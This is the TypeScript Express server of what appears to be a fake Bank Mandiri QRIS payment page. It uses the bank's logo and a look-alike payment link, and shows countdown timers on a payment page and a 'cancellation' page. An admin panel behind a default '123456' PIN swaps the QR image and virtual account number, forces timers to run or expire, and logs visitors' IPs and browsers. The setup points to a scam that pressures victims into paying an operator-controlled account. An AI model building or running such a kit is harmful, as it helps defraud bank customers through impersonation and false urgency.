import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";

interface State {
  qrImageUrl: string;
  useCustomText: boolean;
  qrCustomText: string;
  initialTime: number; // in seconds
  timeLeft: number;    // in seconds
  isTimerRunning: boolean;
  timerTargetTime: number | null; // epoch timestamp when timer will end, or null
  audioUrl: string;
  isExpired: boolean;
  adminPin: string;
  logoUrl: string;
  statusMessage: string;
  virtualAccount: string;

  // Separate Batal timer state
  batalInitialTime: number;
  batalTimeLeft: number;
  batalIsTimerRunning: boolean;
  batalTimerTargetTime: number | null;
  batalIsExpired: boolean;
}

const CONFIG_FILE = path.join(process.cwd(), "qris-config.json");

// Default initial state
const defaultState: State = {
  qrImageUrl: "https://mssq.me/Ganti-gambar",
  useCustomText: false,
  qrCustomText: "https://bmri.id/bayar-qris",
  initialTime: 300, // 5 minutes
  timeLeft: 300,
  isTimerRunning: true,
  timerTargetTime: null, // will be set when running
  audioUrl: "https://image2url.com/r2/bucket3/audio/1768021986386-da3b008e-d598-47eb-8175-33990bd1ac34.m4a",
  isExpired: false,
  adminPin: "123456",
  logoUrl: "https://mediate.co.id/wp-content/uploads/2020/12/Bank_Mandiri_logo.png",
  statusMessage: "SISA WAKTU",
  virtualAccount: "70014080808",

  // Separate Batal timer state defaults
  batalInitialTime: 300,
  batalTimeLeft: 300,
  batalIsTimerRunning: true,
  batalTimerTargetTime: null,
  batalIsExpired: false,
};

let state: State = { ...defaultState };

// Load persisted state if exists
if (fs.existsSync(CONFIG_FILE)) {
  try {
    const fileData = fs.readFileSync(CONFIG_FILE, "utf-8");
    state = { ...defaultState, ...JSON.parse(fileData) };
    console.log("Loaded configuration from", CONFIG_FILE);
  } catch (e) {
    console.error("Failed to read configuration file, using defaults", e);
  }
} else {
  try {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(state, null, 2), "utf-8");
    console.log("Created default configuration file at", CONFIG_FILE);
  } catch (e) {
    console.error("Failed to save default configuration file", e);
  }
}

// Function to save state
function saveState() {
  try {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(state, null, 2), "utf-8");
  } catch (e) {
    console.error("Failed to persist configuration state", e);
  }
}

// Visitor tracking
interface ActiveSession {
  sessionId: string;
  lastActive: number;
  userAgent: string;
  ip: string;
  pageType: "user" | "admin";
}

let activeSessions: { [key: string]: ActiveSession } = {};
interface VisitLog {
  timestamp: string;
  userAgent: string;
  ip: string;
  action: string;
}
let visitLogs: VisitLog[] = [];

function addVisitLog(userAgent: string, ip: string, action: string) {
  visitLogs.unshift({
    timestamp: new Date().toISOString(),
    userAgent: userAgent || "Unknown",
    ip: ip || "Unknown",
    action
  });
  // Keep last 100 logs
  if (visitLogs.length > 100) {
    visitLogs.pop();
  }
}

// Dynamic timer calculation helper
function updateTimerState() {
  // Update User/Transaksi Timer
  if (state.isExpired) {
    state.timeLeft = 0;
  } else if (state.isTimerRunning) {
    if (!state.timerTargetTime) {
      // If running but target time is not set, set it now
      state.timerTargetTime = Date.now() + (state.timeLeft * 1000);
    } else {
      // Calculate remaining seconds
      const diff = Math.max(0, Math.ceil((state.timerTargetTime - Date.now()) / 1000));
      state.timeLeft = diff;
      if (diff === 0) {
        state.isTimerRunning = false;
        state.isExpired = true;
        state.timerTargetTime = null;
        saveState();
      }
    }
  } else {
    // If paused, target time must be null to hold remaining timeLeft stable
    state.timerTargetTime = null;
  }

  // Update Batal Timer
  if (state.batalIsExpired) {
    state.batalTimeLeft = 0;
  } else if (state.batalIsTimerRunning) {
    if (!state.batalTimerTargetTime) {
      state.batalTimerTargetTime = Date.now() + (state.batalTimeLeft * 1000);
    } else {
      const diff = Math.max(0, Math.ceil((state.batalTimerTargetTime - Date.now()) / 1000));
      state.batalTimeLeft = diff;
      if (diff === 0) {
        state.batalIsTimerRunning = false;
        state.batalIsExpired = true;
        state.batalTimerTargetTime = null;
        saveState();
      }
    }
  } else {
    state.batalTimerTargetTime = null;
  }
}

// Tick timer server-side occasionally to auto-expire without requests
setInterval(() => {
  updateTimerState();
}, 1000);

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Ensure uploads directory exists
  const UPLOADS_DIR = path.join(process.cwd(), "uploads");
  if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
  }

  app.use(express.json({ limit: "25mb" }));
  app.use(express.urlencoded({ limit: "25mb", extended: true }));
  app.use("/uploads", express.static(UPLOADS_DIR));

  // Log middleware
  app.use((req, res, next) => {
    // Capture basic client information
    const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
    const userAgent = req.headers["user-agent"] || "";
    
    // We log visits to public pages but skip frequent interval polls
    if (req.path === "/api/state" && req.query.poll !== "true") {
      // Only log initial loads, not continuous polls
    }
    next();
  });

  // Verify PIN helper
  const isAuthorized = (req: express.Request): boolean => {
    const reqPin = req.headers["x-admin-pin"] || req.body.pin;
    return reqPin === state.adminPin;
  };

  // API ROUTES

  // Get current state
  app.get("/api/state", (req, res) => {
    updateTimerState();
    
    // Keep a cleaner public state without the admin PIN
    const { adminPin, ...publicState } = state;
    res.json(publicState);
  });

  // Verify Admin PIN
  app.post("/api/verify-pin", (req, res) => {
    const { pin } = req.body;
    if (pin === state.adminPin) {
      res.json({ success: true });
    } else {
      res.status(401).json({ success: false, error: "PIN Admin tidak valid" });
    }
  });

  // Heartbeat to track active connections
  app.post("/api/heartbeat", (req, res) => {
    const { sessionId, pageType } = req.body;
    const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
    const userAgent = req.headers["user-agent"] || "Unknown";

    if (sessionId) {
      const isNew = !activeSessions[sessionId];
      activeSessions[sessionId] = {
        sessionId,
        lastActive: Date.now(),
        userAgent,
        ip,
        pageType: pageType || "user"
      };

      if (isNew && pageType === "user") {
        addVisitLog(userAgent, ip, "Membuka halaman Pembatalan");
      }
    }
    res.json({ success: true });
  });

  // Update State (Admin Only)
  app.post("/api/state", (req, res) => {
    if (!isAuthorized(req)) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    const updates = req.body.updates || {};
    
    // Process updates
    if (updates.qrImageUrl !== undefined) {
      state.qrImageUrl = updates.qrImageUrl;
      // When barcode changes, auto-resume/run QRIS timer
      state.isTimerRunning = true;
      state.isExpired = false;
      if (state.timeLeft <= 0) {
        state.timeLeft = state.initialTime;
      }
      state.timerTargetTime = Date.now() + (state.timeLeft * 1000);
    }
    if (updates.useCustomText !== undefined) state.useCustomText = !!updates.useCustomText;
    if (updates.qrCustomText !== undefined) state.qrCustomText = updates.qrCustomText;
    if (updates.audioUrl !== undefined) state.audioUrl = updates.audioUrl;
    if (updates.logoUrl !== undefined) state.logoUrl = updates.logoUrl;
    if (updates.statusMessage !== undefined) state.statusMessage = updates.statusMessage;
    if (updates.adminPin !== undefined && updates.adminPin.trim() !== "") state.adminPin = updates.adminPin.trim();
    if (updates.virtualAccount !== undefined) {
      state.virtualAccount = updates.virtualAccount;
      // When virtual account changes, auto-resume/run Batal timer
      state.batalIsTimerRunning = true;
      state.batalIsExpired = false;
      if (state.batalTimeLeft <= 0) {
        state.batalTimeLeft = state.batalInitialTime;
      }
      state.batalTimerTargetTime = Date.now() + (state.batalTimeLeft * 1000);
    }

    // If initialTime is updated, we also update the active countdown and ensure it runs
    if (updates.initialTime !== undefined) {
      const parsedTime = parseInt(updates.initialTime);
      if (!isNaN(parsedTime) && parsedTime > 0) {
        state.initialTime = parsedTime;
        state.timeLeft = parsedTime;
        state.isExpired = false;
        state.isTimerRunning = true;
        state.timerTargetTime = Date.now() + (parsedTime * 1000);
      }
    }

    // Batal initial time update, update active countdown and ensure it runs
    if (updates.batalInitialTime !== undefined) {
      const parsedTime = parseInt(updates.batalInitialTime);
      if (!isNaN(parsedTime) && parsedTime > 0) {
        state.batalInitialTime = parsedTime;
        state.batalTimeLeft = parsedTime;
        state.batalIsExpired = false;
        state.batalIsTimerRunning = true;
        state.batalTimerTargetTime = Date.now() + (parsedTime * 1000);
      }
    }

    saveState();
    
    const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
    const userAgent = req.headers["user-agent"] || "";
    addVisitLog(userAgent, ip, "Memperbarui konfigurasi utama");

    res.json({ success: true, state });
  });

  // Reset Timer (Admin Only)
  app.post("/api/reset-timer", (req, res) => {
    if (!isAuthorized(req)) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    const target = req.body.target || req.query.target || "user";
    const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
    const userAgent = req.headers["user-agent"] || "";

    if (target === "batal") {
      state.batalTimeLeft = state.batalInitialTime;
      state.batalIsExpired = false;
      
      if (state.batalIsTimerRunning) {
        state.batalTimerTargetTime = Date.now() + (state.batalTimeLeft * 1000);
      } else {
        state.batalTimerTargetTime = null;
      }
      
      addVisitLog(userAgent, ip, "Mereset timer Batal ke " + state.batalInitialTime + " detik");
    } else {
      state.timeLeft = state.initialTime;
      state.isExpired = false;
      
      if (state.isTimerRunning) {
        state.timerTargetTime = Date.now() + (state.timeLeft * 1000);
      } else {
        state.timerTargetTime = null;
      }
      
      addVisitLog(userAgent, ip, "Mereset timer QRIS ke " + state.initialTime + " detik");
    }

    saveState();

    res.json({ success: true, state });
  });

  // Toggle Timer (Admin Only)
  app.post("/api/toggle-timer", (req, res) => {
    if (!isAuthorized(req)) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    const target = req.body.target || req.query.target || "user";
    const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
    const userAgent = req.headers["user-agent"] || "";

    if (target === "batal") {
      state.batalIsTimerRunning = !state.batalIsTimerRunning;
      
      if (state.batalIsTimerRunning) {
        state.batalTimerTargetTime = Date.now() + (state.batalTimeLeft * 1000);
      } else {
        state.batalTimerTargetTime = null;
      }
      
      addVisitLog(userAgent, ip, state.batalIsTimerRunning ? "Menjalankan timer Batal" : "Menghentikan sementara timer Batal");
    } else {
      state.isTimerRunning = !state.isTimerRunning;
      
      if (state.isTimerRunning) {
        state.timerTargetTime = Date.now() + (state.timeLeft * 1000);
      } else {
        state.timerTargetTime = null;
      }
      
      addVisitLog(userAgent, ip, state.isTimerRunning ? "Menjalankan timer QRIS" : "Menghentikan sementara timer QRIS");
    }

    saveState();

    res.json({ success: true, state });
  });

  // Force Expire / Reactivate (Admin Only)
  app.post("/api/toggle-expire", (req, res) => {
    if (!isAuthorized(req)) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    const target = req.body.target || req.query.target || "user";
    const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
    const userAgent = req.headers["user-agent"] || "";

    if (target === "batal") {
      state.batalIsExpired = !state.batalIsExpired;
      if (state.batalIsExpired) {
        state.batalTimeLeft = 0;
        state.batalIsTimerRunning = false;
        state.batalTimerTargetTime = null;
      } else {
        state.batalTimeLeft = state.batalInitialTime;
        if (state.batalIsTimerRunning) {
          state.batalTimerTargetTime = Date.now() + (state.batalTimeLeft * 1000);
        }
      }
      addVisitLog(userAgent, ip, state.batalIsExpired ? "Memaksa waktu habis Batal (expired)" : "Mengaktifkan kembali halaman Batal");
    } else {
      state.isExpired = !state.isExpired;
      if (state.isExpired) {
        state.timeLeft = 0;
        state.isTimerRunning = false;
        state.timerTargetTime = null;
      } else {
        state.timeLeft = state.initialTime;
        if (state.isTimerRunning) {
          state.timerTargetTime = Date.now() + (state.timeLeft * 1000);
        }
      }
      addVisitLog(userAgent, ip, state.isExpired ? "Memaksa waktu habis QRIS (expired)" : "Mengaktifkan kembali halaman QRIS");
    }

    saveState();

    res.json({ success: true, state });
  });

  // Get Admin Metrics
  app.get("/api/admin/metrics", (req, res) => {
    if (!isAuthorized(req)) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    // Clean up stale sessions (older than 10 seconds)
    const now = Date.now();
    const cleanSessions: ActiveSession[] = [];
    
    for (const id in activeSessions) {
      if (now - activeSessions[id].lastActive < 10000) {
        cleanSessions.push(activeSessions[id]);
      } else {
        delete activeSessions[id];
      }
    }

    res.json({
      activeUsersCount: cleanSessions.filter(s => s.pageType === "user").length,
      activeAdminsCount: cleanSessions.filter(s => s.pageType === "admin").length,
      activeSessions: cleanSessions,
      visitLogs: visitLogs.slice(0, 30) // return last 30 logs
    });
  });

  // Upload barcode image endpoint (Admin Only)
  app.post("/api/upload", (req, res) => {
    if (!isAuthorized(req)) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    const { image, filename } = req.body;
    if (!image) {
      return res.status(400).json({ error: "No image data provided" });
    }

    try {
      // Expect base64 header like: "data:image/png;base64,iVBORw0KGgoAAAANSU..."
      const matches = image.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
      if (!matches || matches.length !== 3) {
        return res.status(400).json({ error: "Invalid base64 image data" });
      }

      const fileExtension = matches[1].split("/")[1] || "png";
      const base64Data = matches[2];
      const buffer = Buffer.from(base64Data, "base64");

      const uniqueFilename = `qris_${Date.now()}.${fileExtension}`;
      const filePath = path.join(process.cwd(), "uploads", uniqueFilename);

      fs.writeFileSync(filePath, buffer);
      
      const fileUrl = `/uploads/${uniqueFilename}`;

      const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "127.0.0.1";
      const userAgent = req.headers["user-agent"] || "";
      addVisitLog(userAgent, ip, `Mengunggah foto barcode baru (${uniqueFilename})`);

      res.json({ success: true, url: fileUrl });
    } catch (err: any) {
      console.error("Error writing uploaded file:", err);
      res.status(500).json({ error: "Failed to save uploaded image: " + err.message });
    }
  });

  // Vite integration
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
